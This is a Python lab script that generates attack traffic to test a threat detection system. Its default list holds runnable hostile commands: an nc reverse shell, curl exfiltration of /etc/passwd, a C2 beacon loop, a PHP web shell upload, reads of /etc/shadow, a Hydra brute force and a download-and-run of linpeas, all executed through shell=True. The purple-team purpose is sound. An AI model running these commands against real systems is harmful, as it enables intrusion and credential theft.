#!/usr/bin/env python3
"""
generate-attack-traffic.py
AI-Powered Threat Detection System
Attack traffic generation for lab testing
"""

import os
import sys
import json
import time
import logging
import argparse
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional, List

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class AttackSimulator:
    """Simulate attack traffic for testing detection rules"""
    
    def __init__(self, config_path: str = "lab/config/attacks.json"):
        """Initialize attack simulator"""
        self.config_path = Path(config_path)
        self.attacks = self._load_attacks()
    
    def _load_attacks(self) -> List[Dict[str, Any]]:
        """Load attack configurations"""
        default_attacks = [
            {
                "name": "port_scan",
                "description": "Port scanning with Nmap",
                "command": "nmap -sS -sV -p 1-1000 {target}",
                "tool": "nmap",
                "mitre_technique": "T1046",
                "mitre_tactic": "discovery",
                "intensity": "medium"
            },
            {
                "name": "ssh_brute_force",
                "description": "SSH brute force with Hydra",
                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "tool": "hydra",
                "mitre_technique": "T1110",
                "mitre_tactic": "credential_access",
                "intensity": "medium"
            },
            {
                "name": "sql_injection",
                "description": "SQL injection with sqlmap",
                "command": "sqlmap -u 'http://{target}/vulnerable.php?id=1' --dbs",
                "tool": "sqlmap",
                "mitre_technique": "T1190",
                "mitre_tactic": "initial_access",
                "intensity": "medium"
            },
            {
                "name": "reverse_shell",
                "description": "Reverse shell with Netcat",
                "command": "nc {target} 4444 -e /bin/bash",
                "tool": "nc",
                "mitre_technique": "T1059",
                "mitre_tactic": "execution",
                "intensity": "low"
            },
            {
                "name": "privilege_escalation",
                "description": "Privilege escalation with LinPEAS",
                "command": "wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
                "tool": "linpeas",
                "mitre_technique": "T1548",
                "mitre_tactic": "privilege_escalation",
                "intensity": "low"
            },
            {
                "name": "lateral_movement",
                "description": "Lateral movement with PsExec",
                "command": "python3 /usr/share/impacket/examples/psexec.py admin:password@{target}",
                "tool": "impacket",
                "mitre_technique": "T1021",
                "mitre_tactic": "lateral_movement",
                "intensity": "low"
            },
            {
                "name": "data_exfiltration",
                "description": "Data exfiltration with curl",
                "command": "cat /etc/passwd | curl -d @- http://{target}:8080/exfil",
                "tool": "curl",
                "mitre_technique": "T1048",
                "mitre_tactic": "exfiltration",
                "intensity": "low"
            },
            {
                "name": "command_and_control",
                "description": "C2 beacon simulation",
                "command": "while true; do curl -s http://{target}:8080/beacon; sleep 30; done",
                "tool": "curl",
                "mitre_technique": "T1071",
                "mitre_tactic": "command_and_control",
                "intensity": "medium"
            },
            {
                "name": "web_shell_upload",
                "description": "Web shell upload attempt",
                "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php && curl -F 'file=@/tmp/shell.php' http://{target}/upload.php",
                "tool": "curl",
                "mitre_technique": "T1505",
                "mitre_tactic": "persistence",
                "intensity": "low"
            },
            {
                "name": "credential_dump",
                "description": "Credential dumping simulation",
                "command": "cat /etc/shadow /etc/passwd > /tmp/creds.txt",
                "tool": "cat",
                "mitre_technique": "T1003",
                "mitre_tactic": "credential_access",
                "intensity": "low"
            }
        ]
        
        # Load custom config if exists
        if self.config_path.exists():
            try:
                with open(self.config_path, 'r') as f:
                    custom_attacks = json.load(f)
                return custom_attacks
            except Exception as e:
                logger.warning(f"Failed to load custom config: {e}")
        
        return default_attacks
    
    def run_attack(self, attack: Dict[str, Any], target: str, duration: Optional[int] = None) -> bool:
        """Run a single attack"""
        logger.info(f"Running attack: {attack['name']}")
        logger.info(f"  Description: {attack['description']}")
        logger.info(f"  MITRE: {attack['mitre_tactic']}/{attack['mitre_technique']}")
        
        # Replace target placeholder
        command = attack['command'].replace('{target}', target)
        
        # Run the attack
        try:
            proc = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=duration or 60
            )
            
            logger.info(f"  Exit code: {proc.returncode}")
            if proc.stdout:
                logger.debug(f"  Output: {proc.stdout[:200]}")
            if proc.stderr:
                logger.warning(f"  Errors: {proc.stderr[:200]}")
            
            return proc.returncode == 0
        
        except subprocess.TimeoutExpired:
            logger.warning(f"  Attack timed out after {duration or 60} seconds")
            return True  # Timeout may still indicate the attack ran
        except Exception as e:
            logger.error(f"  Attack failed: {str(e)}")
            return False
    
    def run_simulation(self, target: str, duration: str = "30m", intensity: str = "medium", speed: float = 1.0):
        """Run full attack simulation"""
        logger.info("="*60)
        logger.info("ATTACK SIMULATION STARTED")
        logger.info("="*60)
        logger.info(f"Target: {target}")
        logger.info(f"Duration: {duration}")
        logger.info(f"Intensity: {intensity}")
        
        # Parse duration
        duration_sec = self._parse_duration(duration)
        
        # Filter attacks by intensity
        attacks = [
            a for a in self.attacks
            if a.get('intensity', 'medium') == intensity or
               a.get('intensity', 'medium') == 'low' and intensity in ['medium', 'high']
        ]
        
        logger.info(f"Running {len(attacks)} attacks\n")
        
        results = {
            "started_at": datetime.now().isoformat(),
            "target": target,
            "duration": duration,
            "intensity": intensity,
            "attacks": []
        }
        
        start_time = time.time()
        
        for i, attack in enumerate(attacks):
            remaining = duration_sec - (time.time() - start_time)
            if remaining <= 0:
                logger.warning("Simulation duration exceeded, stopping")
                break
            
            # Run the attack
            success = self.run_attack(attack, target, duration=min(60, remaining))
            
            results["attacks"].append({
                "name": attack["name"],
                "success": success,
                "mitre_technique": attack["mitre_technique"],
                "mitre_tactic": attack["mitre_tactic"],
                "timestamp": datetime.now().isoformat()
            })
            
            # Add delay between attacks
            time.sleep(5 * speed)
        
        results["completed_at"] = datetime.now().isoformat()
        
        # Save simulation log
        self._save_results(results)
        
        logger.info("="*60)
        logger.info("ATTACK SIMULATION COMPLETED")
        logger.info("="*60)
        
        return results
    
    def _parse_duration(self, duration: str) -> int:
        """Parse duration string to seconds"""
        if duration.endswith('m'):
            return int(duration[:-1]) * 60
        elif duration.endswith('h'):
            return int(duration[:-1]) * 3600
        elif duration.endswith('s'):
            return int(duration[:-1])
        else:
            return int(duration) * 60
    
    def _save_results(self, results: Dict[str, Any]):
        """Save simulation results"""
        output_dir = Path("lab/logs")
        output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = output_dir / f"attack_simulation_{timestamp}.json"
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"Simulation results saved to {output_file}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Generate attack traffic for lab')
    parser.add_argument('--target', default='192.168.56.20', help='Target IP address')
    parser.add_argument('--duration', default='30m', help='Simulation duration (e.g., 30m, 1h)')
    parser.add_argument('--intensity', default='medium', choices=['low', 'medium', 'high'], help='Attack intensity')
    parser.add_argument('--config', default='lab/config/attacks.json', help='Attack config file')
    parser.add_argument('--speed', type=float, default=1.0, help='Simulation speed multiplier')
    parser.add_argument('--dry-run', action='store_true', help='Dry run (don\'t execute attacks)')
    
    args = parser.parse_args()
    
    if args.dry_run:
        logger.info("Dry run mode - listing attacks without executing")
        simulator = AttackSimulator(config_path=args.config)
        for attack in simulator.attacks:
            logger.info(f"  {attack['name']} - {attack['description']}")
        sys.exit(0)
    
    simulator = AttackSimulator(config_path=args.config)
    
    try:
        results = simulator.run_simulation(
            target=args.target,
            duration=args.duration,
            intensity=args.intensity,
            speed=args.speed
        )
        print("\n✅ Attack simulation completed successfully!")
        print(f"Attacks run: {len(results['attacks'])}")
    except Exception as e:
        logger.error(f"Attack simulation failed: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()